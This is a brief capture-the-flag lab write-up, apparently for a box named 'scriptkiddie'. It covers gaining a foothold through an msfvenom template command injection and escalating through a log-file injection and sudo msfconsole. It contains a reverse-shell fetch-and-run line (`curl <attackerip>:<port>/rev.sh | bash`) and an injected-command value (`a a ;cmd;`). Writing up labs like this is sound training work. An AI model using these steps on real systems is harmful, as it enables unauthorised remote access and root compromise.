scriptkiddie
---

## Steps

1. nmap to find port 5000, metasploit vulnerability

going to port 5000, we see some services

one of the service allows you to upload a template.

there is an exploit for this that allows RCE: https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/

2. Reverse shell

we host a rev.sh, which calls a reverse shell

RCE to execute `curl <attackerip>:<port>/rev.sh | bash`

read user.txt


## Root Flag

1. PWN user

we see another user pwn, and he can run `/home/pwn/scanlosers.sh`, which reads from the file `/home/kid/logs/hacker`

putting a malformed entry `a a ;cmd;` in the file `hacker`, we can run any command as `pwn`. do this to get a reverse shell as pwn

2. sudo

pwn and run `sudo msfconsole`

from there, `cat /root/root.txt`
